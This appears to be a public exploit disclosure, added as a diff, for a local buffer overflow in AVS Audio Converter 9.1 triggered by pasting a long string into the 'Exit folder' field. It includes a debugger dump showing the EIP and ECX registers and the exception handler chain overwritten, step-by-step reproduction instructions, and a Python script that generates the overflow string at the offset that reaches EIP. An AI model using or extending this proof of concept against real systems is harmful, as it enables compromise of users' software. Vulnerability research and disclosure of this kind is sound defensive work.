@@ -1,0 +1,56 @@
+# Exploit Title: AVS Audio Converter 9.1 - 'Exit folder' Buffer Overflow
+# Exploit Author : ZwX
+# Exploit Date: 2019-12-17
+# Vendor Homepage : http://www.avs4you.com/
+# Link Software : http://www.avs4you.com/avs-audio-converter.aspx
+# Tested on OS: Windows 7
+
+'''
+Technical Details & Description:
+================================
+A local buffer overflow vulnerability has been discovered in tihe official AVS Audio Converter. 
+The vulnerability allows local attackers to overwrite the registers (example eip) to compromise the local software process. 
+The issue can be exploited by local attackers with system privileges to compromise the affected local computer system. 
+The vulnerability is marked as classic buffer overflow issue.
+
+
+Analyze Registers:
+==================
+(1e74.1b78): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=00000000 ecx=42424242 edx=778c6d1d esi=00000000 edi=00000000
+eip=42424242 esp=0012f098 ebp=0012f0b8 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210246
+42424242 ??              ???
+0:000> !exchain
+0012f0ac: ntdll!ExecuteHandler2+3a (778c6d1d)
+0012fa30: 42424242
+Invalid exception stack at 41414141
+
+
+Note: EIP & ECX  overwritten
+
+
+Proof of Concept (PoC):
+=======================
+1.Download and install AVS Audio Converter
+2.Open the AVS Audio Converter 
+3.Run the python operating script that will create a file (poc.txt)
+4.copy and paste the characters found in the file (poc.txt) in the field "Exit folder"
+5.Click on browse
+6.EIP overwritten
+'''
+
+#!/usr/bin/python
+
+buffer = "\x41" * 264
+a = "\x42" * 4
+b = "\x43" * 1000
+
+poc = buffer + a + b 
+file = open("poc.txt","w")
+file.write(poc)
+file.close()
+ 
+print "POC Created by ZwX"
